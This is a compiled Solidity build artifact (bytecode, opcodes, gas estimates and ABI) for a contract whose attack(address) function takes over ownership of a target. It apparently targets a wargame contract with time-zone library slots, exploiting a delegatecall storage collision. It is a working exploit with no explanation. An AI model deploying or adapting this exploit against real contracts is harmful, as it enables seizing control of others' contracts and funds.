{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b506105d4806100206000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806327d6974f1461005c5780633beb26c41461007a5780633dc79422146100965780638da5cb5b146100b4578063d018db3e146100d2575b600080fd5b6100646100ee565b604051610071919061049f565b60405180910390f35b610094600480360381019061008f9190610431565b610114565b005b61009e610158565b6040516100ab919061049f565b60405180910390f35b6100bc61017c565b6040516100c9919061049f565b60405180910390f35b6100ec60048036038101906100e791906103d7565b6101a2565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008190508073ffffffffffffffffffffffffffffffffffffffff1663f1e026203073ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016101f691906104da565b600060405180830381600087803b15801561021057600080fd5b505af1158015610224573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff1663f1e026203373ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040161027791906104da565b600060405180830381600087803b15801561029157600080fd5b505af11580156102a5573d6000803e3d6000fd5b505050503373ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b815260040160206040518083038186803b15801561030657600080fd5b505afa15801561031a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061033e9190610404565b73ffffffffffffffffffffffffffffffffffffffff1614610394576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161038b906104ba565b60405180910390fd5b5050565b6000813590506103a781610570565b92915050565b6000815190506103bc81610570565b92915050565b6000813590506103d181610587565b92915050565b6000602082840312156103ed576103ec610542565b5b60006103fb84828501610398565b91505092915050565b60006020828403121561041a57610419610542565b5b6000610428848285016103ad565b91505092915050565b60006020828403121561044757610446610542565b5b6000610455848285016103c2565b91505092915050565b61046781610506565b82525050565b600061047a6004836104f5565b915061048582610547565b602082019050919050565b61049981610538565b82525050565b60006020820190506104b4600083018461045e565b92915050565b600060208201905081810360008301526104d38161046d565b9050919050565b60006020820190506104ef6000830184610490565b92915050565b600082825260208201905092915050565b600061051182610518565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600080fd5b7f6661696c00000000000000000000000000000000000000000000000000000000600082015250565b61057981610506565b811461058457600080fd5b50565b61059081610538565b811461059b57600080fd5b5056fea26469706673582212200799fb2bfa30fc40f77d350b1cdffd0e69296924cdae40dbb0c688d7c521492664736f6c63430008070033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5D4 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x27D6974F EQ PUSH2 0x5C JUMPI DUP1 PUSH4 0x3BEB26C4 EQ PUSH2 0x7A JUMPI DUP1 PUSH4 0x3DC79422 EQ PUSH2 0x96 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xB4 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0xD2 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x64 PUSH2 0xEE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x71 SWAP2 SWAP1 PUSH2 0x49F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x94 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x8F SWAP2 SWAP1 PUSH2 0x431 JUMP JUMPDEST PUSH2 0x114 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x9E PUSH2 0x158 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xAB SWAP2 SWAP1 PUSH2 0x49F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xBC PUSH2 0x17C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xC9 SWAP2 SWAP1 PUSH2 0x49F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xEC PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xE7 SWAP2 SWAP1 PUSH2 0x3D7 JUMP JUMPDEST PUSH2 0x1A2 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST DUP1 PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF1E02620 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1F6 SWAP2 SWAP1 PUSH2 0x4DA JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x210 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x224 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF1E02620 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x277 SWAP2 SWAP1 PUSH2 0x4DA JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x291 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2A5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x8DA5CB5B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x306 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x31A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x33E SWAP2 SWAP1 PUSH2 0x404 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x394 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x38B SWAP1 PUSH2 0x4BA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x3A7 DUP2 PUSH2 0x570 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x3BC DUP2 PUSH2 0x570 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x3D1 DUP2 PUSH2 0x587 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x3ED JUMPI PUSH2 0x3EC PUSH2 0x542 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x3FB DUP5 DUP3 DUP6 ADD PUSH2 0x398 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x41A JUMPI PUSH2 0x419 PUSH2 0x542 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x428 DUP5 DUP3 DUP6 ADD PUSH2 0x3AD JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x447 JUMPI PUSH2 0x446 PUSH2 0x542 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x455 DUP5 DUP3 DUP6 ADD PUSH2 0x3C2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x467 DUP2 PUSH2 0x506 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x47A PUSH1 0x4 DUP4 PUSH2 0x4F5 JUMP JUMPDEST SWAP2 POP PUSH2 0x485 DUP3 PUSH2 0x547 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x499 DUP2 PUSH2 0x538 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4B4 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x45E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x4D3 DUP2 PUSH2 0x46D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4EF PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x490 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x511 DUP3 PUSH2 0x518 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH32 0x6661696C00000000000000000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH2 0x579 DUP2 PUSH2 0x506 JUMP JUMPDEST DUP2 EQ PUSH2 0x584 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x590 DUP2 PUSH2 0x538 JUMP JUMPDEST DUP2 EQ PUSH2 0x59B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SMOD SWAP10 0xFB 0x2B STATICCALL ADDRESS 0xFC BLOCKHASH 0xF7 PUSH30 0x350B1CDFFD0E69296924CDAE40DBB0C688D7C521492664736F6C63430008 SMOD STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "298400",
				"executionCost": "337",
				"totalCost": "298737"
			},
			"external": {
				"attack(address)": "infinite",
				"owner()": "2558",
				"setTime(uint256)": "24673",
				"timeZone1Library()": "2533",
				"timeZone2Library()": "2492"
			}
		},
		"methodIdentifiers": {
			"attack(address)": "d018db3e",
			"owner()": "8da5cb5b",
			"setTime(uint256)": "3beb26c4",
			"timeZone1Library()": "3dc79422",
			"timeZone2Library()": "27d6974f"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_addr",
					"type": "address"
				}
			],
			"name": "attack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "owner",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "uint256",
					"name": "_value",
					"type": "uint256"
				}
			],
			"name": "setTime",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "timeZone1Library",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "timeZone2Library",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		}
	]
}